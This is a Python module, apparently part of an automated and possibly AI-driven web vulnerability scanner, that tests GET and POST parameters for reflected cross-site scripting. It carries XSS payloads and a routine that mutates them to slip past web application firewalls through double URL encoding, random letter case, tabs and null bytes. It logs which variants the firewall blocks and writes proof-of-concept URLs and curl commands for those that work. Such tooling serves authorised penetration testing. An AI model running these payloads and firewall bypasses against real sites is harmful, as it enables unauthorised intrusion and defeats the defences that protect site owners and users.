import urllib.parse
import random
from ..http_engine import HTTPEngine

class XSSSkill:
    def __init__(self):
        self.name = "Reflected XSS (WAF Evasion)"
        self.base_payloads = [
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>'
        ]

    def _mutate_payloads(self, base_payload: str) -> list:
        """Generate WAF bypass variants of a payload."""
        mutations = []
        
        # 1. URL Encoding (e.g., %3Cscript%3E)
        mutations.append(urllib.parse.quote(base_payload))
        
        # 2. Double URL Encoding (e.g., %253Cscript%253E)
        mutations.append(urllib.parse.quote(urllib.parse.quote(base_payload)))
        
        # 3. HTML Entities (for some weak filters)
        mutations.append(base_payload.replace('<', '&lt;').replace('>', '&gt;'))
        
        # 4. Mixed Case (e.g., <ScRiPt>)
        mixed_case = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in base_payload)
        mutations.append(mixed_case)
        
        # 5. Add Null Bytes or Tabs (breaks some regex engines)
        mutations.append(base_payload.replace(' ', '%09')) # Tab
        mutations.append(base_payload.replace('<script>', '<scr\x00ipt>')) # Null byte
        
        return mutations

    async def run(self, target: dict, engine: HTTPEngine, custom_payload: str = None) -> list:
        findings = []
        
        url = target["url"]
        method = target["method"]
        params = target["params"].copy()
        
        # If the AI provided a custom payload, use it as the base, otherwise use defaults
        payloads_to_test = [custom_payload] if custom_payload else self.base_payloads

        # --- HANDLE GET REQUESTS ---
        if method == "GET":
            parsed = urllib.parse.urlparse(url)
            url_params = urllib.parse.parse_qs(parsed.query)
            
            if not url_params:
                return findings

            for param_name in url_params:
                for base_payload in payloads_to_test:
                    # Generate the evasion variants for this payload
                    evasion_payloads = self._mutate_payloads(base_payload)
                    
                    for payload in evasion_payloads:
                        test_params = url_params.copy()
                        test_params[param_name] = [payload]
                        test_url = parsed._replace(query=urllib.parse.urlencode(test_params, doseq=True)).geturl()
                        
                        response = await engine.request("GET", test_url)
                        if not response: continue

                        # Check for WAF Block
                        if response.status_code in [403, 406]:
                            print(f"    [WAF BLOCK] Payload '{payload[:20]}...' was blocked.")
                            continue # Try the next mutated payload

                        if payload in response.text:
                            poc = f"Open this URL in a browser:\n{test_url}"
                            findings.append({
                                "skill": self.name,
                                "target": test_url,
                                "issue": f"Reflected XSS in parameter '{param_name}' (GET)",
                                "severity": "High",
                                "evidence": f"WAF bypass successful. Payload '{payload}' reflected unencoded.",
                                "poc": poc
                            })
                            break # Found a working payload, stop mutating this parameter

        # --- HANDLE POST REQUESTS ---
        elif method == "POST":
            if not params:
                return findings

            for param_name in params:
                for base_payload in payloads_to_test:
                    evasion_payloads = self._mutate_payloads(base_payload)
                    
                    for payload in evasion_payloads:
                        test_data = params.copy()
                        test_data[param_name] = payload
                        
                        response = await engine.request("POST", url, data=test_data)
                        if not response: continue

                        if response.status_code in [403, 406]:
                            print(f"    [WAF BLOCK] Payload '{payload[:20]}...' was blocked.")
                            continue

                        if payload in response.text:
                            curl_data = "&".join([f"{k}={v}" for k, v in test_data.items()])
                            poc = f"Run this command:\ncurl -X POST -d \"{curl_data}\" {url}"
                            
                            findings.append({
                                "skill": self.name,
                                "target": url,
                                "issue": f"Reflected XSS in parameter '{param_name}' (POST)",
                                "severity": "High",
                                "evidence": f"WAF bypass successful. Payload '{payload}' reflected unencoded.",
                                "poc": poc
                            })
                            break
                        
        return findings
